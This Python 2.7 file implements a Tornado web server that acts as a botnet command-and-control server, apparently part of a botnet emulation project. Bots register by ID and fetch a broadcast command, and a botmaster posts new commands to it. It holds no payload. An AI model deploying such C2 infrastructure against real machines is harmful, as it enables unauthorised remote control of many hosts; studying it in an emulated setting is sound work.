#!/usr/bin/env python2.7
# coding=UTF-8
"""This file implements a CnC-Server that presents a web interface over which it can issue commands to bots
and keep track of bots that register themselves regularly with the server. A command may be any method that
is defined in Bot_Commands.py. This method will be executed by all bots that fetch it.
All handler support plain text and json output."""

import json
import logging
import string
import sys
import time
import tornado.web
from threading import Thread
from tornado.ioloop import IOLoop

from AbstractBot import Runnable
from resources import emu_config
from utils.NetworkUtils import NetworkAddressSchema


# TODO: Remove plain text output

def make_app():
    """Starts the web interface that is used to interact with this server."""
    handlers = [("/", MainHandler), ("/register", RegisterHandler), ("/current_command", CurrentCommandHandler)]
    return tornado.web.Application(handlers, autoreload=True)


class BotInformation(object):
    def __init__(self, botid):
        self.last_seen = time.time()
        self.botid = botid


class MainHandler(tornado.web.RequestHandler):
    def get(self):
        if "json" in string.lower(self.request.headers.get("Accept")):
            self.set_header("Content-Type", "application/json")
            self.write(json.dumps(tornado.web.Application.handlers))
        else:
            self.write("This server offers the following functions:\n"
                       "/register where bots can register themselves so we can keep track of them."
                       "/current_command where bots can retrieve commands that they should execute")

class CurrentCommandHandler(tornado.web.RequestHandler):
    """A handler that lets bots fetch the current command via HTTP GET and lets the botmaster issue a new command via
    HTTP POST."""

    current_command = {}

    def get(self):
        if "json" in string.lower(self.request.headers.get("Accept")):
            self.set_header("Content-Type", "application/json")
            self.write(json.dumps(self.current_command))
        else:
            self.set_header("Content-Type", "text/plain")
            self.write("Command: hello there")

    def post(self):
        old_command = self.current_command
        # noinspection PyBroadException
        try:
            self.current_command["command"] = self.get_body_argument("command")
            self.current_command["kwargs"] = json.loads(self.get_body_argument("kwargs"))
            logging.debug("The CnC-Server has received a new command: " % self.current_command)
        except:
            # rolls the change back
            self.current_command = old_command

        self.set_header("Content-Type", "text/plain")
        self.write("OK")


class RegisterHandler(tornado.web.RequestHandler):
    """Bots can register via HTTP POST, the number of currently known bots can be retrieved via HTTP GET"""

    registered_bots = dict()

    def get(self):
        if "json" in string.lower(self.request.headers.get("Accept")):
            self.set_header("Content-Type", "application/json")
            self.write(json.dumps({"num_clients": len(self.registered_bots)}))
        else:
            self.set_header("Content-Type", "text/plain")
            self.write("Total number of known clients: %d" % len(self.registered_bots))

    def post(self):
        self.set_header("Content-Type", "text/plain")
        botid = int(self.get_body_argument("id"))
        if self.registered_bots.has_key(botid):
            self.registered_bots[botid].last_seen = time.time()
        else:
            self.registered_bots[botid] = BotInformation(botid)
        self.write("OK")
        logging.debug("Bot %s has registered itself with the server" % botid)


class CnCServer(Runnable):
    """Allows the CnCServer to be run in its own thread."""

    def __init__(self, name=""):
        Runnable.__init__(self, name)

    def start(self, port=emu_config.PORT):
        """Implements start() from the superclass."""
        app = make_app()
        app.listen(port)
        IOLoop.current().start()

    def stop(self):
        """Implements stop() from the superclass."""
        IOLoop.current().stop()


if __name__ == "__main__":
    cncserver = CnCServer("cnc1")

    schema = NetworkAddressSchema()
    if len(sys.argv) >= 2:
        cncaddress = schema.loads(sys.argv[1]).data
        target_arguments = (cncaddress.port,)
    else:
        target_arguments = ()

    thread = Thread(name="Runnable mycnc1", target=cncserver.start, args=target_arguments)
    thread.start()
